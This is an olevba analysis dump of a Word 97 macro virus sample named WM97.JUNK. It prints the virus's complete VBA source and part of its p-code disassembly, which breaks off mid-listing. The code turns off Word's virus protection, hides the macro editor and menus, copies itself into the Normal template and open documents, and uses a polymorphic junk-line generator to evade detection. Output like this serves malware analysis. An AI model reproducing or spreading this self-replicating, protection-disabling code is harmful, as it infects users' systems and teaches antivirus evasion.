olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Junk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Junk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: ./Virus.MSWord.Junk - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Autoopen()
'The junk code will be placed ere
Set nor = NormalTemplate.VBProject.VBComponents(1).CodeModule
'The junk code will be placed ere
Set doc = ActiveDocument.VBProject.VBComponents(1).CodeModule
'The junk code will be placed ere
Set ths = ThisDocument.VBProject.VBComponents(1).CodeModule
'The junk code will be placed ere
j = 0
'The junk code will be placed ere
Do
'The junk code will be placed ere
j = j + 2
'The junk code will be placed ere
ths.replaceline j, Junkstr
'The junk code will be placed ere
Loop Until j = 62
'The junk code will be placed ere
With Options
'The junk code will be placed ere
.VirusProtection = 0
'The junk code will be placed ere
.ConfirmConversions = 0
'The junk code will be placed ere
.SaveNormalPrompt = 0
'The junk code will be placed ere
.SendMailAttach = 1
'The junk code will be placed ere
.Application.EnableCancelKey = wdCancelDisabled
'The junk code will be placed ere
.Application.ScreenUpdating = 0
'The junk code will be placed ere
.Application.ShowVisualBasicEditor = 0
'The junk code will be placed ere
.Application.CommandBars("Tools").Controls("macro").Enabled = 0
'The junk code will be placed ere
End With
'The junk code will be placed ere
mycode = ths.lines(1, ths.countoflines)
'The junk code will be placed ere
With nor
'The junk code will be placed ere
.deletelines 1, .countoflines
'The junk code will be placed ere
.addfromstring mycode
'The junk code will be placed ere
End With
'The junk code will be placed ere
With doc
'The junk code will be placed ere
.deletelines 1, .countoflines
'The junk code will be placed ere
.addfromstring mycode
'The junk code will be placed ere
End With
'The junk code will be placed ere
If Day(Now()) = 31 Then
'The junk code will be placed ere
MsgBox "Hi, i am full of junk - so byte me!"
'The junk code will be placed ere
End If
'The junk code will be placed ere
'WM97.JUNK
End Sub

Private Function Junkstr()
'THE BIG JUNK GENERATOR
'BY VLAM
A = Int(Rnd * 5) + 1
ll = Int((Rnd * 50) + 10)
l = Int(Rnd * 2)
Select Case A
Case 1
    Randomize Timer
    s = Int(Rnd * 8) + 1
    Select Case s
    Case 1: k = " XOR "
    Case 2: k = " AND "
    Case 3: k = " EQV "
    Case 4: k = " - "
    Case 5: k = " + "
    Case 6: k = " OR "
    Case 7: k = " & "
    Case 8: k = " IMP "
    End Select
    junk = k
    kk = Int(Rnd * 3) + 1
    Select Case kk
    Case 1: Junkstr = GETRNDWORD(ll, l) & " = " & GETRNDWORD(ll, l) & junk & GETRNDWORD(ll, l)
    Case 2: Junkstr = GETRNDWORD(ll, l) & " = " & GETRNDWORD(ll, l) & junk & GETRNDWORD(ll, l) & junk & GETRNDWORD(ll, l)
    Case 3: Junkstr = GETRNDWORD(ll, l) & " = " & GETRNDWORD(ll, l) & junk & GETRNDWORD(ll, l) & junk & GETRNDWORD(ll, l) & junk & GETRNDWORD(ll, l)
    End Select
Case 2:
    Randomize Timer
    s = Int(Rnd * 20) + 1
    Select Case s
    Case 1: k = "OPTIONS"
    Case 2: k = "TASKS"
    Case 3: k = "APPLICATION"
    Case 4: k = "ACTIVEDOCUMENT"
    Case 5: k = "NORMALTEMPLATE"
    Case 6: k = "THISDOCUMENT"
    Case 7: k = "ACTIVEWINDOW"
    Case 8: k = "SYSTEM"
    Case 9: k = "WINDOWS"
    Case 10: k = "ASSISTANT"
    Case 11: k = "COMMANDBARS"
    Case 12: k = "COMMENTS"
    Case 13: k = "FRAMES"
    Case 14: k = "INDEXES"
    Case 15: k = "KEYBINDINGS"
    Case 16: k = "OPTIONS.APPLICATION"
    Case 17: k = "LANGUAGES"
    Case 18: k = "SYSTEM"
    Case 19: k = "LISTS"
    Case 20: k = "LISTTEMPLATES"
    End Select
    Junkstr = "SET " & GETRNDWORD(ll, l) & " = " & k
Case 3:
    JJ = Int(Rnd * 2) + 1
    Select Case JJ
    Case 1: k = "'"
    Case 2: k = "rem "
    End Select
    Junkstr = k & getshit(Int(Rnd * 200) + 50)
Case 4:
    JJ = (Int(Rnd * 2) + 1)
    Select Case JJ
    Case 1
        Junkstr = GETRNDWORD(ll, l) & ":"
    Case 2
        JJ = (Int(Rnd * 11) + 1)
        Select Case JJ
        Case 1: ASWHAT = " AS STRING"
        Case 2: ASWHAT = " AS BYTE"
        Case 3: ASWHAT = " AS LONG"
        Case 4: ASWHAT = " AS INTEGER"
        Case 5: ASWHAT = " AS CURRENCY"
        Case 6: ASWHAT = " AS BOOLEAN"
        Case 7: ASWHAT = " AS SINGLE"
        Case 8: ASWHAT = " AS DOUBLE"
        Case 9: ASWHAT = " AS DATE"
        Case 10: ASWHAT = " AS MSORGBTYPE"
        Case 11: ASWHAT = " AS VARIANT"
        End Select
        Junkstr = "DIM " & GETRNDWORD(ll, l) & ASWHAT
    End Select
Case 5:
    JJ = Int(Rnd * 11) + 1
    Select Case JJ
    Case 1: Junkstr = GETRNDWORD(ll, l) & " = " & genchr(ll)
    Case 2: Junkstr = GETRNDWORD(ll, l) & " = " & Chr(34) & getshit(ll) & Chr(34)
    Case 3: Junkstr = GETRNDWORD(ll, l) & " = " & GETRNDWORD(ll, l)
    Case 4: Junkstr = GETRNDWORD(ll, l) & " = " & Rnd * 99999.99
    Case 5: Junkstr = GETRNDWORD(ll, l) & " = " & Rnd * 99999.99 & " XOR " & Rnd * 99999.99
    Case 6: Junkstr = GETRNDWORD(ll, l) & " = " & Rnd * 99999.99 & " - " & Rnd * 99999.99
    Case 7: Junkstr = GETRNDWORD(ll, l) & " = " & Rnd * 99999.99 & " AND  " & Rnd * 99999.99
    Case 8: Junkstr = GETRNDWORD(ll, l) & " = " & Rnd * 99999.99 & " OR " & Rnd * 99999.99
    Case 9: Junkstr = GETRNDWORD(ll, l) & " = " & Rnd * 99999.99 & " MOD " & Rnd * 99999.99
    Case 10: Junkstr = GETRNDWORD(ll, l) & " = " & Rnd * 99999.99 & " + " & Rnd * 99999.99
    Case 11: Junkstr = GETRNDWORD(ll, l) & " = " & Rnd * 99999.99 & " XOR " & Rnd * 99999.99
    End Select
End Select
End Function
Private Function GETRNDWORD(LENGTHOFWORD, MustIIncludeNumbers)
Select Case MustIIncludeNumbers
Case 0
    For i = 1 To LENGTHOFWORD
    JJ = (Int(Rnd * 2) + 1)
    Select Case JJ
    Case 1: P = P & Chr((Rnd * 22) + 65)
    Case 2: P = P & Chr((Rnd * 22) + 97)
    End Select
    Next
Case 1
    For i = 1 To (LENGTHOFWORD / 2)
    JJ = (Int(Rnd * 2) + 1)
    Select Case JJ
    Case 1: P = P & Chr((Rnd * 22) + 65) & Int(Rnd * 10) + 1
    Case 2: P = P & Chr((Rnd * 22) + 97) & Int(Rnd * 10) + 1
    End Select
    Next
End Select
GETRNDWORD = P
End Function
Private Function getshit(length)
For i = 1 To length
g = g & Chr(Int(Rnd * 210) + 35)
Next
getshit = g
End Function

Private Function genchr(length)
For i = 1 To length
g = "Chr(" & Int(Rnd * 255) & ")"
k = " & "
l = l & g & k
Next
genchr = Left(l, (Len(l) - 3))
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Junk
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11687 bytes
' Macros/VBA/ThisDocument1 - 11795 bytes
' Line #0:
' 	FuncDefn (Private Sub Autoopen())
' Line #1:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #2:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #3:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #4:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set doc 
' Line #5:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ths 
' Line #7:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #8:
' 	LitDI2 0x0000 
' 	St j 
' Line #9:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #10:
' 	Do 
' Line #11:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #12:
' 	Ld j 
' 	LitDI2 0x0002 
' 	Add 
' 	St j 
' Line #13:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #14:
' 	Ld j 
' 	Ld Junkstr 
' 	Ld ths 
' 	ArgsMemCall replaceline 0x0002 
' Line #15:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #16:
' 	Ld j 
' 	LitDI2 0x003E 
' 	Eq 
' 	LoopUntil 
' Line #17:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #18:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #19:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #20:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #21:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #22:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #23:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #24:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #25:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #26:
' 	LitDI2 0x0001 
' 	MemStWith SendMailAttach 
' Line #27:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #28:
' 	Ld wdCancelDisabled 
' 	MemLdWith Application 
' 	MemSt EnableCancelKey 
' Line #29:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #30:
' 	LitDI2 0x0000 
' 	MemLdWith Application 
' 	MemSt ScreenUpdating 
' Line #31:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #32:
' 	LitDI2 0x0000 
' 	MemLdWith Application 
' 	MemSt ShowVisualBasicEditor 
' Line #33:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #34:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "macro"
' 	LitStr 0x0005 "Tools"
' 	MemLdWith Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #35:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #36:
' 	EndWith 
' Line #37:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #38:
' 	LitDI2 0x0001 
' 	Ld ths 
' 	MemLd countoflines 
' 	Ld ths 
' 	ArgsMemLd lines 0x0002 
' 	St mycode 
' Line #39:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #40:
' 	StartWithExpr 
' 	Ld nor 
' 	With 
' Line #41:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #42:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #43:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #44:
' 	Ld mycode 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #45:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #46:
' 	EndWith 
' Line #47:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #48:
' 	StartWithExpr 
' 	Ld doc 
' 	With 
' Line #49:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #50:
' 	LitDI2 0x0001 
' 	MemLdWith countoflines 
' 	ArgsMemCallWith deletelines 0x0002 
' Line #51:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #52:
' 	Ld mycode 
' 	ArgsMemCallWith addfromstring 0x0001 
' Line #53:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #54:
' 	EndWith 
' Line #55:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #56:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	IfBlock 
' Line #57:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #58:
' 	LitStr 0x0023 "Hi, i am full of junk - so byte me!"
' 	ArgsCall MsgBox 0x0001 
' Line #59:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x0020 "The junk code will be placed ere"
' Line #62:
' 	QuoteRem 0x0000 0x0009 "WM97.JUNK"
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Private Function Junkstr(id_FFFE As Variant))
' Line #66:
' 	QuoteRem 0x0000 0x0016 "THE BIG JUNK GENERATOR"
' Line #67:
' 	QuoteRem 0x0000 0x0007 "BY VLAM"
' Line #68:
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St A 
' Line #69:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	Paren 
' 	LitDI2 0x000A 
' 	Add 
' 	FnInt 
' 	St ll 
' Line #70:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St l 
' Line #71:
' 	Ld A 
' 	SelectCase 
' Line #72:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #73:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #74:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St s 
' Line #75:
' 	Ld s 
' 	SelectCase 
' Line #76:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 " XOR "
' 	St k 
' Line #77:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 " AND "
' 	St k 
' Line #78:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 " EQV "
' 	St k 
' Line #79:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0003 " - "
' 	St k 
' Line #80:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0003 " + "
' 	St k 
' Line #81:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0004 " OR "
' 	St k 
' Line #82:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0003 " & "
' 	St k 
' Line #83:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 " IMP "
' 	St k 
' Line #84:
' 	EndSelect 
' Line #85:
' 	Ld k 
' 	St junk 
' Line #86:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St kk 
' Line #87:
' 	Ld kk 
' 	SelectCase 
' Line #88:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	Ld junk 
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	St Junkstr 
' Line #89:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	Ld junk 
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	Ld junk 
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	St Junkstr 
' Line #90:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	Ld junk 
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	Ld junk 
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	Ld junk 
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	St Junkstr 
' Line #91:
' 	EndSelect 
' Line #92:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #93:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #94:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St s 
' Line #95:
' 	Ld s 
' 	SelectCase 
' Line #96:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "OPTIONS"
' 	St k 
' Line #97:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "TASKS"
' 	St k 
' Line #98:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B "APPLICATION"
' 	St k 
' Line #99:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000E "ACTIVEDOCUMENT"
' 	St k 
' Line #100:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000E "NORMALTEMPLATE"
' 	St k 
' Line #101:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000C "THISDOCUMENT"
' 	St k 
' Line #102:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000C "ACTIVEWINDOW"
' 	St k 
' Line #103:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0006 "SYSTEM"
' 	St k 
' Line #104:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "WINDOWS"
' 	St k 
' Line #105:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0009 "ASSISTANT"
' 	St k 
' Line #106:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B "COMMANDBARS"
' 	St k 
' Line #107:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0008 "COMMENTS"
' 	St k 
' Line #108:
' 	LitDI2 0x000D 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0006 "FRAMES"
' 	St k 
' Line #109:
' 	LitDI2 0x000E 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0007 "INDEXES"
' 	St k 
' Line #110:
' 	LitDI2 0x000F 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B "KEYBINDINGS"
' 	St k 
' Line #111:
' 	LitDI2 0x0010 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0013 "OPTIONS.APPLICATION"
' 	St k 
' Line #112:
' 	LitDI2 0x0011 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0009 "LANGUAGES"
' 	St k 
' Line #113:
' 	LitDI2 0x0012 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0006 "SYSTEM"
' 	St k 
' Line #114:
' 	LitDI2 0x0013 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0005 "LISTS"
' 	St k 
' Line #115:
' 	LitDI2 0x0014 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000D "LISTTEMPLATES"
' 	St k 
' Line #116:
' 	EndSelect 
' Line #117:
' 	LitStr 0x0004 "SET "
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld k 
' 	Concat 
' 	St Junkstr 
' Line #118:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #119:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St JJ 
' Line #120:
' 	Ld JJ 
' 	SelectCase 
' Line #121:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0001 "'"
' 	St k 
' Line #122:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0004 "rem "
' 	St k 
' Line #123:
' 	EndSelect 
' Line #124:
' 	Ld k 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0032 
' 	Add 
' 	ArgsLd getshit 0x0001 
' 	Concat 
' 	St Junkstr 
' Line #125:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #126:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	St JJ 
' Line #127:
' 	Ld JJ 
' 	SelectCase 
' Line #128:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #129:
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	St Junkstr 
' Line #130:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #131:
' 	Ld Rnd 
' 	LitDI2 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	St JJ 
' Line #132:
' 	Ld JJ 
' 	SelectCase 
' Line #133:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " AS STRING"
' 	St ASWHAT 
' Line #134:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0008 " AS BYTE"
' 	St ASWHAT 
' Line #135:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0008 " AS LONG"
' 	St ASWHAT 
' Line #136:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B " AS INTEGER"
' 	St ASWHAT 
' Line #137:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000C " AS CURRENCY"
' 	St ASWHAT 
' Line #138:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B " AS BOOLEAN"
' 	St ASWHAT 
' Line #139:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " AS SINGLE"
' 	St ASWHAT 
' Line #140:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000A " AS DOUBLE"
' 	St ASWHAT 
' Line #141:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0008 " AS DATE"
' 	St ASWHAT 
' Line #142:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000E " AS MSORGBTYPE"
' 	St ASWHAT 
' Line #143:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000B " AS VARIANT"
' 	St ASWHAT 
' Line #144:
' 	EndSelect 
' Line #145:
' 	LitStr 0x0004 "DIM "
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	Ld ASWHAT 
' 	Concat 
' 	St Junkstr 
' Line #146:
' 	EndSelect 
' Line #147:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' Line #148:
' 	Ld Rnd 
' 	LitDI2 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St JJ 
' Line #149:
' 	Ld JJ 
' 	SelectCase 
' Line #150:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld ll 
' 	ArgsLd genchr 0x0001 
' 	Concat 
' 	St Junkstr 
' Line #151:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld ll 
' 	ArgsLd getshit 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Junkstr 
' Line #152:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	Concat 
' 	St Junkstr 
' Line #153:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	St Junkstr 
' Line #154:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	LitStr 0x0005 " XOR "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	St Junkstr 
' Line #155:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	LitStr 0x0003 " - "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	St Junkstr 
' Line #156:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	LitStr 0x0006 " AND  "
' 	Concat 
' 	Ld Rnd 
' 	LitR8 0x3D71 0xD70A 0x69FF 0x40F8 
' 	Mul 
' 	Concat 
' 	St Junkstr 
' Line #157:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld ll 
' 	Ld l 
' 	ArgsLd GETRNDWORD 0x0002 
' 	LitStr 0x0003 " = "
' 	Concat 
